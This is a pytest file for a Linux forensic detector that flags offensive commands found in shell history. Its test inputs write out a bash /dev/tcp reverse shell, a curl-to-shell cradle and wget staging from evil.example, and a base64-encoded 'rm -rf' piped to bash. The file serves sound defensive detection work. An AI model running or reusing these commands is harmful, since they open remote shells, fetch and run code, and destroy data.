"""Tests for the Linux history-based execution detector (SFE-jdii).

Exercises the suspicious-command-execution signal recovered from shell history
(``~/.bash_history``, ``.zsh_history``): a recorded command matching an
offensive shape (reverse shell, ``curl|sh``, ``base64|eval``, ``wget`` to
``/tmp``) is flagged as execution (MITRE ATT&CK **T1059.004**, Unix Shell). The
malicious shapes and benign decoys (recon commands, ordinary admin commands)
are all covered so precision is exercised, not assumed.

API under test: ``LinuxExecutionDetector.analyze(artifacts: dict) -> list[Finding]``
reading ``artifacts["shell_history"]``. Inputs are synthetic in-memory dicts.
"""

from __future__ import annotations

from sift_find_evil.detectors.linux_execution import LinuxExecutionDetector
from sift_find_evil.findings import FindingCategory


def _cmd(command: str, path: str = "/root/.bash_history") -> dict:
    return {"path": path, "command": command}


def test_reverse_shell_command_is_flagged() -> None:
    """A bash /dev/tcp reverse shell in history fires an execution finding."""
    entries = [_cmd("bash -i >& /dev/tcp/203.0.113.5/4444 0>&1")]

    findings = LinuxExecutionDetector().analyze({"shell_history": entries})

    assert len(findings) == 1
    finding = findings[0]
    assert finding.category is FindingCategory.EXECUTION
    assert finding.evidence["mitre_technique"] == "T1059.004"
    assert finding.evidence["path"] == "/root/.bash_history"
    assert finding.artifact_sources == ["bash_history"]


def test_curl_piped_to_shell_is_flagged() -> None:
    """A curl|sh download-and-run cradle is flagged."""
    entries = [_cmd("curl http://evil.example/x.sh | sh")]

    findings = LinuxExecutionDetector().analyze({"shell_history": entries})

    assert len(findings) == 1
    assert findings[0].category is FindingCategory.EXECUTION


def test_base64_decoded_payload_is_flagged() -> None:
    """A base64 -d | bash obfuscated payload is flagged."""
    entries = [_cmd("echo cm0gLXJm | base64 -d | bash")]

    assert len(LinuxExecutionDetector().analyze({"shell_history": entries})) == 1


def test_wget_staging_to_tmp_is_flagged() -> None:
    """A downloader writing a payload into /tmp is flagged (staging shape)."""
    entries = [_cmd("wget http://evil.example/m -O /tmp/m")]

    assert len(LinuxExecutionDetector().analyze({"shell_history": entries})) == 1


def test_execution_from_tmp_is_flagged() -> None:
    """A world-writable path run as a program (executable position) fires."""
    entries = [
        _cmd("/tmp/implant"),
        _cmd("sudo /dev/shm/rootkit"),
    ]

    assert len(LinuxExecutionDetector().analyze({"shell_history": entries})) == 2


def test_interpreter_and_chmod_on_tmp_are_flagged() -> None:
    """Running a /tmp script via an interpreter, or arming it, fires.

    Covers shell and scripting interpreters plus both chmod forms (SFE-l3ep
    review): ``+x`` and a numeric octal mode with an execute bit.
    """
    entries = [
        _cmd("bash /tmp/stage2.sh"),
        _cmd("source /dev/shm/env"),
        _cmd("python3 /tmp/exploit.py"),
        _cmd("perl /tmp/x.pl"),
        _cmd("chmod +x /tmp/implant"),
        _cmd("chmod u+x /tmp/implant"),
        _cmd("chmod 755 /tmp/implant"),
    ]

    assert len(LinuxExecutionDetector().analyze({"shell_history": entries})) == 7


def test_quoted_tmp_path_is_flagged() -> None:
    """Quoting the payload path does not evade the execution/staging shapes."""
    entries = [
        _cmd("'/tmp/evil'"),
        _cmd('"/dev/shm/evil"'),
        _cmd('curl http://evil.example/x -o "/tmp/implant"'),
    ]

    assert len(LinuxExecutionDetector().analyze({"shell_history": entries})) == 3


def test_chmod_without_execute_bit_does_not_fire() -> None:
    """A numeric chmod with no execute bit (e.g. 644) on /tmp is not staging.

    FP guard for the numeric-mode branch: only modes that set an execute bit
    (an odd octal digit) count as arming a payload.
    """
    entries = [
        _cmd("chmod 644 /tmp/config"),
        _cmd("chmod 600 /tmp/secret"),
    ]

    assert LinuxExecutionDetector().analyze({"shell_history": entries}) == []


def test_benign_tmp_reads_do_not_fire() -> None:
    """Read/navigation references to /tmp are not execution and must not fire.

    Mutation guard for SFE-l3ep: reverting the shape to the old
    "any /tmp reference" pattern turns this test red.
    """
    entries = [
        _cmd("cat /tmp/build.log"),
        _cmd("ls -la /tmp/"),
        _cmd("vim /tmp/session-notes.txt"),
        _cmd("cd /tmp"),
        _cmd("grep error /tmp/app.log"),
        _cmd("rm /tmp/stale.tmp"),
    ]

    assert LinuxExecutionDetector().analyze({"shell_history": entries}) == []


def test_url_path_containing_tmp_does_not_stage_match() -> None:
    """A URL whose path contains /tmp/ is not a staging write into /tmp."""
    entries = [_cmd("curl https://cdn.example/tmp/logo.png")]

    assert LinuxExecutionDetector().analyze({"shell_history": entries}) == []


def test_one_finding_per_malicious_command() -> None:
    """Each malicious history line produces its own finding."""
    entries = [
        _cmd("whoami"),
        _cmd("curl http://evil.example/x.sh | sh"),
        _cmd("bash -i >& /dev/tcp/10.0.0.9/9001 0>&1"),
    ]

    findings = LinuxExecutionDetector().analyze({"shell_history": entries})

    assert len(findings) == 2


def test_benign_recon_commands_do_not_fire() -> None:
    """Recon/admin commands with no offensive shape are not flagged."""
    entries = [
        _cmd("whoami"),
        _cmd("id"),
        _cmd("uname -a"),
        _cmd("cat /etc/passwd"),
        _cmd("ls -la"),
        _cmd("cd /var/www"),
        _cmd("git status"),
        _cmd("sudo apt update"),
    ]

    assert LinuxExecutionDetector().analyze({"shell_history": entries}) == []


def test_entries_without_command_are_skipped() -> None:
    """Malformed entries lacking a command are ignored, not counted."""
    entries = [{"path": "/root/.bash_history"}, {"command": ""}]

    assert LinuxExecutionDetector().analyze({"shell_history": entries}) == []


def test_empty_input_returns_no_findings() -> None:
    """Missing/empty shell_history yields an empty list, not an error."""
    assert LinuxExecutionDetector().analyze({}) == []
    assert LinuxExecutionDetector().analyze({"shell_history": []}) == []
